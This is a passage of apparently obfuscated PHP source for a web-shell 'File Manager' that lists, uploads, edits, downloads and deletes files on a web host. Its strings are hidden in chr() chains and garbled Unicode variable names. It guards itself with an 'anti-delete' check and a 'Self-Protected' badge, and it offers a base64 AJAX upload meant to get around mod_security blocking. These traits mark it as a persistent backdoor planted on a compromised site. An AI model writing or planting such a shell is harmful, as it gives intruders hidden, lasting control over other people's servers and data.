        $ﬗえﬗ̩̂̂̄ = safe_realpath_within($㉆̧̧̣́̈ . DIRECTORY_SEPARATOR . $ね㌁̌, $ᛇ̥ね㌁̊̈̂̌);
        if (!$ﬗえﬗ̩̂̂̄) { flash(chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(112).chr(97).chr(116).chr(104).chr(46)); header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit; }
        
        if (realpath($ﬗえﬗ̩̂̂̄) === realpath($ᛒ̨̩̩̄̋)) {
            flash(chr(226).chr(155).chr(148).chr(32).chr(65).chr(78).chr(84).chr(73).chr(45).chr(68).chr(69).chr(76).chr(69).chr(84).chr(69).chr(58).chr(32).chr(70).chr(105).chr(108).chr(101).chr(32).chr(109).chr(97).chr(110).chr(97).chr(103).chr(101).chr(114).chr(32).chr(105).chr(110).chr(105).chr(32).chr(100).chr(105).chr(108).chr(105).chr(110).chr(100).chr(117).chr(110).chr(103).chr(105).chr(32).chr(100).chr(97).chr(110).chr(32).chr(116).chr(105).chr(100).chr(97).chr(107).chr(32).chr(98).chr(105).chr(115).chr(97).chr(32).chr(100).chr(105).chr(104).chr(97).chr(112).chr(117).chr(115).chr(33));
            header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit;
        }
        if (is_dir($ﬗえﬗ̩̂̂̄)) { flash(rrmdir($ﬗえﬗ̩̂̂̄) ? chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(100).chr(46) : chr(70).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(46)); }
        elseif (is_file($ﬗえﬗ̩̂̂̄)) { flash(@unlink($ﬗえﬗ̩̂̂̄) ? chr(70).chr(105).chr(108).chr(101).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(100).chr(46) : chr(70).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(100).chr(101).chr(108).chr(101).chr(116).chr(101).chr(32).chr(102).chr(105).chr(108).chr(101).chr(46)); }
        header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit;

    case chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(95).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114):
        $ᛃᛈ㼁̨̩̅̇ = sanitize_name(isset($_POST[chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(95).chr(110).chr(97).chr(109).chr(101)]) ? $_POST[chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(95).chr(110).chr(97).chr(109).chr(101)] : '');
        if ($ᛃᛈ㼁̨̩̅̇ !== '') {
            $ᛏ㲁らㄉ̦̋̄ = $㉆̧̧̣́̈ . DIRECTORY_SEPARATOR . $ᛃᛈ㼁̨̩̅̇;
            if (!file_exists($ᛏ㲁らㄉ̦̋̄)) flash(@mkdir($ᛏ㲁らㄉ̦̋̄, 0777, true) ? chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100).chr(46) : chr(70).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(32).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114).chr(46));
            else flash(chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(97).chr(108).chr(114).chr(101).chr(97).chr(100).chr(121).chr(32).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115).chr(46));
        } else flash(chr(70).chr(111).chr(108).chr(100).chr(101).chr(114).chr(32).chr(110).chr(97).chr(109).chr(101).chr(32).chr(114).chr(101).chr(113).chr(117).chr(105).chr(114).chr(101).chr(100).chr(46));
        header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit;

    case chr(100).chr(111).chr(119).chr(110).chr(108).chr(111).chr(97).chr(100):
        $ね㌁̌ = sanitize_name(isset($_GET['file']) ? $_GET['file'] : '');
        $ﬗえﬗ̩̂̂̄ = safe_realpath_within($㉆̧̧̣́̈ . DIRECTORY_SEPARATOR . $ね㌁̌, $ᛇ̥ね㌁̊̈̂̌);
        if ($ﬗえﬗ̩̂̂̄ && is_file($ﬗえﬗ̩̂̂̄)) {
            header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(101).chr(115).chr(99).chr(114).chr(105).chr(112).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(70).chr(105).chr(108).chr(101).chr(32).chr(84).chr(114).chr(97).chr(110).chr(115).chr(102).chr(101).chr(114));
            header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(84).chr(121).chr(112).chr(101).chr(58).chr(32).chr(97).chr(112).chr(112).chr(108).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(47).chr(111).chr(99).chr(116).chr(101).chr(116).chr(45).chr(115).chr(116).chr(114).chr(101).chr(97).chr(109));
            header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(68).chr(105).chr(115).chr(112).chr(111).chr(115).chr(105).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(97).chr(116).chr(116).chr(97).chr(99).chr(104).chr(109).chr(101).chr(110).chr(116).chr(59).chr(32).chr(102).chr(105).chr(108).chr(101).chr(110).chr(97).chr(109).chr(101).chr(61).chr(34) . basename($ﬗえﬗ̩̂̂̄) . '"');
            header(chr(67).chr(111).chr(110).chr(116).chr(101).chr(110).chr(116).chr(45).chr(76).chr(101).chr(110).chr(103).chr(116).chr(104).chr(58).chr(32) . filesize($ﬗえﬗ̩̂̂̄));
            header(chr(80).chr(114).chr(97).chr(103).chr(109).chr(97).chr(58).chr(32).chr(112).chr(117).chr(98).chr(108).chr(105).chr(99));
            header(chr(67).chr(97).chr(99).chr(104).chr(101).chr(45).chr(67).chr(111).chr(110).chr(116).chr(114).chr(111).chr(108).chr(58).chr(32).chr(109).chr(117).chr(115).chr(116).chr(45).chr(114).chr(101).chr(118).chr(97).chr(108).chr(105).chr(100).chr(97).chr(116).chr(101));
            readfile($ﬗえﬗ̩̂̂̄); exit;
        }
        flash(chr(70).chr(105).chr(108).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100).chr(46)); header(chr(76).chr(111).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(58).chr(32).chr(63).chr(100).chr(105).chr(114).chr(61) . urlencode($㌁̣̆ᛏ̅̆̂)); exit;
}

$ᛉ̥ᛜら̀̄̉ = get_file_list($㉆̧̧̣́̈);
$ᛇ㌁̀̅̌ = flash();
$ﬓ̩ﾚ̨̥̩̃ = isset($_SESSION[chr(99).chr(119).chr(100).chr(95).chr(104).chr(105).chr(115).chr(116).chr(111).chr(114).chr(121)]) ? $_SESSION[chr(99).chr(119).chr(100).chr(95).chr(104).chr(105).chr(115).chr(116).chr(111).chr(114).chr(121)] : array();
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>File Manager</title>
<style>
body{font-family:Arial;background:#f4f4f4;padding:20px;}
.container{background:#fff;padding:20px;border-radius:10px;box-shadow:0 0 10px #ccc;}
.btn{background:#007bff;color:#fff;padding:6px 10px;border-radius:5px;text-decoration:none;border:none;cursor:pointer;display:inline-block;font-size:13px;}
.btn:hover{opacity:.9;}
.btn.red{background:#dc3545;}
.btn.gray{background:#6c757d;}
.btn.green{background:#28a745;}
.btn.purple{background:#6f42c1;}
.btn.disabled{background:#999;pointer-events:none;opacity:.7;}
.table{width:100%;border-collapse:collapse;}
th,td{padding:10px;border-bottom:1px solid #ddd;text-align:left;font-size:14px;}
th{background:#007bff;color:#fff;}
.pathbox{background:#f7f7f7;padding:8px;border-radius:6px;border:1px solid #ddd;line-height:1.6;font-size:13px;}
.alert{background:#eaf7ea;color:#1d6b1d;padding:10px;border-radius:6px;margin-bottom:15px;border:1px solid #bfe3bf;}
input[type="text"]{padding:8px;min-width:250px;}
#progressWrap{display:none;margin-top:8px;background:#eee;height:14px;border-radius:7px;overflow:hidden;}
#progressBar{height:100%;width:0;background:#28a745;transition:width .2s;}
small.muted{color:#666;}
.lock-badge{display:inline-block;padding:3px 8px;border-radius:4px;font-size:12px;font-weight:bold;background:#d4edda;color:#155724;}
.cwd-form{display:inline-block;margin-right:5px;}
.history-list{margin:8px 0 0 0;padding:0;list-style:none;font-size:13px;}
.history-list li{margin:3px 0;}
.history-list a{color:#007bff;text-decoration:none;}
.history-list a:hover{text-decoration:underline;}
</style>
</head>
<body>
<div class="container">

<h2>File Manager <span class="lock-badge">🔒 Self-Protected</span></h2>

<?php if ($ᛇ㌁̀̅̌): ?>
    <div class="alert"><?php echo htmlspecialchars($ᛇ㌁̀̅̌, ENT_QUOTES, 'UTF-8'); ?></div>
<?php endif; ?>

<div class="pathbox">
    <b>Root:</b> <?php echo htmlspecialchars($ᛇ̥ね㌁̊̈̂̌); ?><br>
    <b>Current:</b> <?php echo htmlspecialchars($㉆̧̧̣́̈); ?><br>
    <b>Writable:</b> <?php echo is_writable($㉆̧̧̣́̈) ? chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(103).chr(114).chr(101).chr(101).chr(110).chr(34).chr(62).chr(89).chr(101).chr(115).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62) : chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(115).chr(116).chr(121).chr(108).chr(101).chr(61).chr(34).chr(99).chr(111).chr(108).chr(111).chr(114).chr(58).chr(114).chr(101).chr(100).chr(34).chr(62).chr(78).chr(111).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62); ?><br>
    <b>upload_max_filesize:</b> <?php echo ini_get(chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(95).chr(109).chr(97).chr(120).chr(95).chr(102).chr(105).chr(108).chr(101).chr(115).chr(105).chr(122).chr(101)); ?> |
    <b>post_max_size:</b> <?php echo ini_get(chr(112).chr(111).chr(115).chr(116).chr(95).chr(109).chr(97).chr(120).chr(95).chr(115).chr(105).chr(122).chr(101)); ?> |
    <b>file_uploads:</b> <?php echo ini_get(chr(102).chr(105).chr(108).chr(101).chr(95).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(115)) ? 'On' : 'Off'; ?>
</div>

<br>

<?php if (!$ぁぁ̣̃̌): ?>
    <a class="btn gray" href="?dir=<?php echo urlencode($ﬅ̤㦁ᛇﬔ̄̄́); ?>">⬅ Back</a>
<?php else: ?>
    <span class="btn disabled">⬅ Back</span>
<?php endif; ?>
<a class="btn" href="?">Default (public_html)</a>
<a class="btn" href="?dir=">Root (domains)</a>

<!-- ============ CWD (Change Directory) FORM ============ -->
<div style="margin-top:10px;padding:10px;background:#f0f8ff;border-radius:6px;border:1px solid #cce5ff;">
    <b>🔄 CWD (Change Working Directory):</b>
    <form class="cwd-form" method="post" action="?action=cwd">
        <input type="text" name="cwd_path" placeholder="contoh: folder1/folder2" value="<?php echo htmlspecialchars($㌁̣̆ᛏ̅̆̂); ?>" required>
        <button class="btn purple" type="submit">Go to Path</button>
    </form>
    <?php if (!empty($ﬓ̩ﾚ̨̥̩̃)): ?>
        <div style="margin-top:5px;font-size:12px;color:#555;">Recent:</div>
        <ul class="history-list">
            <?php foreach ($ﬓ̩ﾚ̨̥̩̃ as $㼁́̌): ?>
                <li>→ <a href="?dir=<?php echo urlencode($㼁́̌); ?>"><?php echo htmlspecialchars($㼁́̌ === '' ? '/' : $㼁́̌); ?></a></li>
            <?php endforeach; ?>
        </ul>
    <?php endif; ?>
</div>

<br>

<!-- ============ AJAX BASE64 UPLOAD ============ -->
<form onsubmit="event.preventDefault(); ajaxUpload();">
    <input type="file" id="fileInput" required>
    <button class="btn green" type="submit">Upload (AJAX)</button>
    <small class="muted">Recommended — works even if 406 appears.</small>
    <div id="progressWrap"><div id="progressBar"></div></div>
</form>

<br>

<!-- ============ Normal upload ============ -->
<form method="post" enctype="multipart/form-data" action="?action=upload&amp;dir=<?php echo urlencode($㌁̣̆ᛏ̅̆̂); ?>">
    <input type="file" name="file" required>
    <button class="btn gray" type="submit">Upload (Normal)</button>
    <small class="muted">Use if AJAX fails.</small>
</form>

<br>

<form method="post" action="?action=create_folder&amp;dir=<?php echo urlencode($㌁̣̆ᛏ̅̆̂); ?>">
    <input type="text" name="folder_name" placeholder="Folder name" required>
    <button class="btn" type="submit">Create Folder</button>
</form>

<br><br>

<table class="table">
<tr>
    <th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th>
</tr>

<?php if (empty($ᛉ̥ᛜら̀̄̉)): ?>
<tr><td colspan="5">No files found.</td></tr>
<?php else: ?>
    <?php foreach ($ᛉ̥ᛜら̀̄̉ as $ﬆ̩̃): ?>
    <tr>
        <td><?php echo htmlspecialchars($ﬆ̩̃['name']); ?>
            <?php if (realpath($ﬆ̩̃['path']) === realpath($ᛒ̨̩̩̄̋)) echo chr(32).chr(60).chr(115).chr(112).chr(97).chr(110).chr(32).chr(99).chr(108).chr(97).chr(115).chr(115).chr(61).chr(34).chr(108).chr(111).chr(99).chr(107).chr(45).chr(98).chr(97).chr(100).chr(103).chr(101).chr(34).chr(62).chr(83).chr(69).chr(76).chr(70).chr(60).chr(47).chr(115).chr(112).chr(97).chr(110).chr(62); ?>
        </td>
        <td><?php echo htmlspecialchars($ﬆ̩̃['type']); ?></td>
        <td><?php echo $ﬆ̩̃['type'] === 'file' ? format_size($ﬆ̩̃['size']) : '-'; ?></td>
        <td><?php echo htmlspecialchars($ﬆ̩̃[chr(109).chr(111).chr(100).chr(105).chr(102).chr(105).chr(101).chr(100)]); ?></td>
        <td>
            <?php if ($ﬆ̩̃['type'] === chr(100).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121)):
                $ﬆᚠᛖﬓㄉ̂ = ($㌁̣̆ᛏ̅̆̂ ? $㌁̣̆ᛏ̅̆̂ . '/' : '') . $ﬆ̩̃['name'];
            ?>
                <a class="btn" href="?dir=<?php echo urlencode($ﬆᚠᛖﬓㄉ̂); ?>">Open</a>
            <?php else: ?>
                <a class="btn" href="?action=view&amp;file=<?php echo urlencode($ﬆ̩̃['name']); ?>&amp;dir=<?php echo urlencode($㌁̣̆ᛏ̅̆̂); ?>">View</a>
                <a class="btn" href="?action=edit&amp;file=<?php echo urlencode($ﬆ̩̃['name']); ?>&amp;dir=<?php echo urlencode($㌁̣̆ᛏ̅̆̂); ?>">Edit</a>
                <a class="btn" href="?action=download&amp;file=<?php echo urlencode($ﬆ̩̃['name']); ?>&amp;dir=<?php echo urlencode($㌁̣̆ᛏ̅̆̂); ?>">Download</a>
            <?php endif; ?>
            <?php if (realpath($ﬆ̩̃['path']) === realpath($ᛒ̨̩̩̄̋)): ?>
                <span class="btn disabled" title="Anti-delete aktif">🔒 Protected</span>
            <?php else: ?>
                <a class="btn red" href="?action=delete&amp;file=<?php echo urlencode($ﬆ̩̃['name']); ?>&amp;dir=<?php echo urlencode($㌁̣̆ᛏ̅̆̂); ?>" onclick="return confirm('Delete this item?')">Delete</a>
            <?php endif; ?>
        </td>
    </tr>
    <?php endforeach; ?>
<?php endif; ?>
</table>

</div>

<script>
function ajaxUpload() {
    var input = document.getElementById('fileInput');
    if (!input.files.length) { alert('Select a file first.'); return; }

    var file = input.files[0];
    var wrap = document.getElementById('progressWrap');
    var bar  = document.getElementById('progressBar');
    wrap.style.display = 'block';
    bar.style.width = '0%';

    var reader = new FileReader();
    reader.onprogress = function(e) {
        if (e.lengthComputable) {
            var pct = Math.round((e.loaded / e.total) * 50);
            bar.style.width = pct + '%';
        }
    };
    reader.onload = function(e) {
        bar.style.width = '70%';
        var b64 = e.target.result;

        var xhr = new XMLHttpRequest();
        xhr.open('POST', '?action=upload_ajax&dir=<?php echo urlencode($㌁̣̆ᛏ̅̆̂); ?>', true);
        xhr.setRequestHeader('Content-Type', 'application/json');

        xhr.upload.onprogress = function(ev) {
            if (ev.lengthComputable) {
                var pct = 70 + Math.round((ev.loaded / ev.total) * 30);
                bar.style.width = pct + '%';
            }
        };

        xhr.onload = function() {
            bar.style.width = '100%';
            var res;
            try { res = JSON.parse(xhr.responseText); }
            catch (err) {
                alert('Server returned: HTTP ' + xhr.status + '\n' + xhr.responseText.substring(0, 300));
                return;
            }
            if (res.ok) {
                alert('✔ ' + res.message);
                location.reload();
            } else {
                alert('✘ ' + res.error);
            }
        };

        xhr.onerror = function() {
            alert('Network error (HTTP ' + xhr.status + '). If it is 406, mod_security is still blocking — try adding .htaccess file.');
        };

        xhr.send(JSON.stringify({ name: file.name, data: b64 }));
    };
    reader.onerror = function() { alert('FileReader error.'); };
    reader.readAsDataURL(file);
}
</script>

</body>
</html>
